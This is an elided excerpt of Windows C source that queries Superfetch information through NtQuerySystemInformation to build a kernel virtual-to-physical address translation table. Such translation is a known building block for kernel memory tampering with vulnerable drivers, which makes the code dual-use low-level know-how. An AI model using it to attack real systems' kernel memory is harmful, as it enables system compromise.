NTSTATUS supQuerySuperfetchInformation(_In_ SUPERFETCH_INFORMATION_CLASS
                                           InfoClass,
                                       _In_ PVOID Buffer,
                                       _In_ ULONG Length,
                                       _Out_opt_ PULONG ReturnLength) {
    ...
    ntStatus =
        NtQuerySystemInformation(SystemSuperfetchInformation, &superfetchInfo,
                                 sizeof(superfetchInfo), &returnedLength);
 ...
 *
 */
BOOL supQuerySuperfetchMemoryRanges(_Out_ PVOID* RangeBuffer,
    ...
    *RangeCount = 0;
    ...
    if (ntBuildNumber >= NT_WIN10_REDSTONE5) {
        ...
        ntStatus = supQuerySuperfetchInformation(
            SuperfetchMemoryRangesQuery, &rangeInfoV2, sizeof(rangeInfoV2),
            &bufferLength);
        ...
        if (ntStatus == STATUS_BUFFER_TOO_SMALL && bufferLength > 0) {
            ...
            ntStatus = supQuerySuperfetchInformation(
                SuperfetchMemoryRangesQuery, buffer, bufferLength, NULL);
    ...
    ntStatus =
        supQuerySuperfetchInformation(SuperfetchMemoryRangesQuery, &rangeInfoV1,
                                      sizeof(rangeInfoV1), &bufferLength);
    ...
    if (ntStatus == STATUS_BUFFER_TOO_SMALL && bufferLength > 0) {
        ...
        ntStatus = supQuerySuperfetchInformation(SuperfetchMemoryRangesQuery,
 ...
 *
 */
BOOL supBuildSuperfetchMemoryMap(_Out_ PSUPERFETCH_MEMORY_MAP MemoryMap) {
    NTSTATUS ntStatus;
    ULONG ntBuildNumber;
    ULONG rangeCount = 0;
    ULONG i;
    ...
    for (i = 0; i < rangeCount; i++) {
        if (useV2) {
            pageCount =
                ((PPF_MEMORY_RANGE_INFO_V2)rangeBuffer)->Ranges[i].PageCount;
        } else {
            pageCount =
                ((PPF_MEMORY_RANGE_INFO_V1)rangeBuffer)->Ranges[i].PageCount;
        }
    ...
    for (i = 0; i < rangeCount; i++) {
        if (useV2) {
            basePfn =
                ((PPF_MEMORY_RANGE_INFO_V2)rangeBuffer)->Ranges[i].BasePfn;
            pageCount =
                ((PPF_MEMORY_RANGE_INFO_V2)rangeBuffer)->Ranges[i].PageCount;
        } else {
            basePfn =
                ((PPF_MEMORY_RANGE_INFO_V1)rangeBuffer)->Ranges[i].BasePfn;
            pageCount =
                ((PPF_MEMORY_RANGE_INFO_V1)rangeBuffer)->Ranges[i].PageCount;
        }
        ...
        ntStatus = supQuerySuperfetchInformation(SuperfetchPfnQuery, pfnRequest,
                                                 pfnBufferSize, NULL);

        if (NT_SUCCESS(ntStatus)) {
            for (j = 0; j < pageCount; j++) {
                ULONG_PTR virtAddr =
                    (ULONG_PTR)pfnRequest->PageData[j].u2.VirtualAddress;

                if (virtAddr != 0 && (virtAddr & 0xFFFF800000000000ULL)) {
                    translationTable[currentEntry].VirtualAddress =
                        virtAddr & ~(PAGE_SIZE - 1);
                    translationTable[currentEntry].PhysicalAddress =
                        (basePfn + j) << PAGE_SHIFT;
                    currentEntry++;
                }
            }
        }
 ...
 *
 */
VOID supFreeSuperfetchMemoryMap(_In_ PSUPERFETCH_MEMORY_MAP MemoryMap) {
 ...
 *
 */
BOOL supSuperfetchVirtualToPhysical(_In_ PSUPERFETCH_MEMORY_MAP MemoryMap,
